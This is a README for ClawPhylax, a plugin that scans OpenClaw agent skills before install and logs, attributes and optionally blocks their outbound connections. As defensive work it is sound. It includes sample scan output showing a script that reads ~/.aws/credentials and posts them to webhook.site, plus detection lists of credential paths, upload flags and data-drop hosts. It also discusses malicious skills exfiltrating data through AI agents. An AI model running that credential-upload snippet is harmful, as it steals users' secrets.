# ClawPhylax

**Verify a skill before you install it. See where installed skills send data.**
Every outbound connection of your OpenClaw agent, attributed to the skill or tool that caused it. In-process, no proxy, no cloud, no config.

```bash
openclaw plugins install clawphylax
openclaw plugins enable clawphylax
```

Then use your agent as usual, and ask:

```bash
openclaw clawphylax report
```

```
ClawPhylax — outbound connections by origin (2 events, 2 host pairs)

origin              hosts  calls  sent   flagged  blocked  baseline   last
tool:exec           1      1      0 B    1        0        learning   9s ago
model-turn          1      1      0 B    0        0        learning   9s ago

Flagged (most recent):
  21:11:09 tool:exec   POST  127.0.0.1/collect via exec (suspicious) [upload,raw-ip,new-host]
```

That output is real: it is the end-to-end test in this repository, run through the actual OpenClaw agent loop (`openclaw agent --local`) against a mock model that asked `exec` to upload something. The upload arrived at the drop server; the ledger had already recorded where it was going, attributed to the tool call.

## Why

Third-party skills run with your agent's access: files, shell, credentials, messaging. ClawHub has had hundreds of malicious skills ([Snyk: 341](https://clawtrust.ai/blog/openclaw-security-341-malicious-skills-and-what-we-do-about-it), [Bitdefender: ~900](https://www.mintmcp.com/blog/secure-openclaw-enterprise)); Cisco demonstrated a data-exfiltrating skill that [ranked #1 in its category](https://github.com/openclaw/openclaw/issues/11014).

Static scanners are the right first line and, by their own numbers, a thin one: Cisco's open-source [skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) reports **7.75 % recall** on unseen malicious skills in its source-disjoint benchmark. Roughly one in thirteen. The rest run.

Once a skill runs, intent is invisible; only behavior shows. ClawPhylax records the behavior.

## What it does

**Before install — `clawphylax_scan` / `openclaw clawphylax scan <folder>`**
Reads SKILL.md code blocks and bundled scripts. Lists every host they name, whether they upload (`-d`, `-T`, `--data`, `requests.post`, `scp`…), and whether they read credential-like files (`~/.ssh`, `.env`, `~/.aws/credentials`, keychain…). Verdict: `clean` / `review` / `suspicious`.

```
SUSPICIOUS — 2 files, 1 host(s): webhook.site
  scripts/run.py:2  (no host) [sensitive-read]  k=open(os.path.expanduser("~/.aws/credentials")).read()
  scripts/run.py:3  POST webhook.site [upload]  requests.post("https://webhook.site/x", data=k)
```

**At runtime — the ledger**
- Every in-process HTTP/HTTPS/fetch request of the Gateway is attributed to the tool call open at the time. Three seams are patched: `node:http`/`https`, `globalThis.fetch`, and OpenClaw's own bundled `undici` (the one its provider transport uses — verified, not assumed).
- `exec` commands are read before they run: hosts (`curl`, `wget`, `ssh`, `scp`, `git@`, `requests.post(...)`), upload intent, credential reads. When a command runs a script from `skills/<name>/`, the event is attributed to that skill.
- A built-in list of the usual drop points (pastebin, transfer.sh, webhook.site, ngrok, interact.sh, …) marks hosts `suspicious`. Add your own.
- **Destination baseline per origin.** A Dirichlet model over the hosts each origin contacts, with a Wilson bound on its novelty rate. A new host is flagged `unexpected-host` only when the origin's baseline is *stable* (enough history, few destinations). While an origin is `learning` or `volatile` (`web_fetch` talks to everything), the gate stays silent. Act on the bound, not the point estimate.
- One-line footer in the agent's reply when a run touched new or suspicious hosts.

**For agents — tools**
`clawphylax_report`, `clawphylax_hosts`, `clawphylax_scan`, `clawphylax_card`. Your agent can answer "is this skill safe?" from evidence instead of from vibes. The bundled `clawphylax-verify` skill tells it when to.

**Between machines — witness cards**
`openclaw clawphylax card skill:<name>` renders what a skill did here (hosts, counts, flags, baseline) as markdown with the marker `clawphylax-card/v1`. Post it in the skill's ClawHub review or an issue. Other agents search for the marker before they install. No server, no account, no identity — evidence in the places people already look.

**Observe-only by default.** `mode: "enforce"` blocks in-process requests and `exec` commands to denylisted hosts before they run.

## What it does not do

- **Child-process traffic is not traced.** `exec` is analyzed as text. A downloaded script that phones home later is invisible in v0.1. OpenClaw strips proxy variables from plugin-contributed exec environments, so that route is closed to plugins; a host-level capture path is on the roadmap.
- **Skill attribution is best-effort.** Exact when a command references `skills/<name>/`; otherwise you get the tool and the run. Requests outside any tool call are `unattributed`; provider calls show as `model-turn`.
- **Parallel tool calls** are attributed to the most recently opened one.
- **No TLS inspection, no bodies, no headers.** Host, method, path, status, byte counts, timing.
- The reply footer is covered by unit tests; whether it reaches your chat depends on the channel's delivery path (`message_sending` hook).
- Not a scanner, not a sandbox. Run Cisco's scanner before install, ClawPhylax while running, the sandbox when you can.

## Commands

```bash
openclaw clawphylax report [--since 24h] [--json]
openclaw clawphylax hosts skill:notes-sync
openclaw clawphylax recent [--limit 50] [--origin tool:exec]
openclaw clawphylax scan ./skills/some-skill [--json]
openclaw clawphylax card skill:notes-sync [--json]
openclaw clawphylax allow  skill:notes-sync api.notion.com
openclaw clawphylax deny   '*' pastebin.com
openclaw clawphylax rules
openclaw clawphylax export --since 7d > events.jsonl
openclaw clawphylax status
```

## Configuration

`openclaw.json` → `plugins.entries.clawphylax.config`:

```json5
{
  mode: "observe",        // or "enforce"
  notify: "footer",       // or "off"
  denylist: ["evil.example"],
  allowlist: ["api.notion.com"],
}
```

CLI rules (`allow`/`deny`) live in the ledger and take precedence over lists.

## Compared to

| | ClawPhylax | Cisco skill-scanner | OpenClaw sandbox | Managed hosts (ClawTrust, xCloud…) | MintMCP |
|---|---|---|---|---|---|
| When | before install + at runtime | before install | at runtime | at runtime | at runtime |
| Sees | connections per tool call / skill | file contents | tool availability, container isolation | everything, on their VPS | MCP tool invocations via proxy |
| Needs | `plugins install` | Python | Docker/crabbox | migration | gateway deployment |
| Attribution to origin | yes (best-effort for exec) | n/a | no | policy engine | per tool call |
| Cost | free, MIT | free, Apache | free | paid | paid |

They compose. ClawPhylax is the part that runs after the scanner said "no findings".

**Neighbors on ClawHub you should know about:** [`@victorqr/clawguard`](https://clawhub.ai) (runtime tool-call interception, allow/deny/approve, file/network path rules, audit log), [`@clawnify/agent-permissions`](https://clawhub.ai) (allow/deny/ask engine for tool calls), [`policy-layer`](https://clawhub.ai) (dangerous-pattern and secret-redaction layers). They decide *which tool may run*. ClawPhylax records *which connection actually happened*, at the transport layer, including model calls through OpenClaw's own undici — and it adds the pre-install scan, the per-origin baseline, and witness cards. If you already run one of them, keep it; ClawPhylax sits underneath. Pre-install checkers such as [`clawdex`](https://clawhub.ai) (Koi) and `pulsefeed-x402-trust` answer "is this package known-bad?" from a database; `clawphylax_scan` reads the files in front of you, and the ledger shows what they did afterwards.

## Verified against

OpenClaw 2026.6.1 on Node 24.16, Windows. Unit tests (`npm test`, 23 tests) cover the interceptor on a local HTTP server, exec analysis, the baseline gate, the scan and the CLI. The end-to-end run (`e2e/mock-provider.mjs`) drives the real embedded agent through a mock OpenAI-compatible provider and checks that the ledger contains both the provider call and the exec target. Plugin APIs are experimental upstream; every hook field is read defensively, so a renamed field costs attribution, never uptime.

## Roadmap

- **0.2** `allow-once / allow-always` for new hosts through OpenClaw's approval flow
- **0.3** host-level capture for child processes on macOS/Linux
- **0.4** opt-in, hashed sharing of `(skill, version, host)` pairs so a baseline can be compared across machines without posting cards by hand

## Development

```bash
npm install && npm link openclaw     # or a devDependency on the host version you target
npm test
npm run plugin:link                  # build, link into your Gateway, enable
npm run plugin:inspect               # proves the hooks and tools registered
node e2e/mock-provider.mjs           # then: OPENCLAW_STATE_DIR=<isolated dir> openclaw agent --local ...
```

Node ≥ 24.16 (uses `node:sqlite`, so no native dependency lands in the Gateway's managed plugin project).

## License

MIT. Security reports: [SECURITY.md](SECURITY.md). Data handling: [PRIVACY.md](PRIVACY.md).
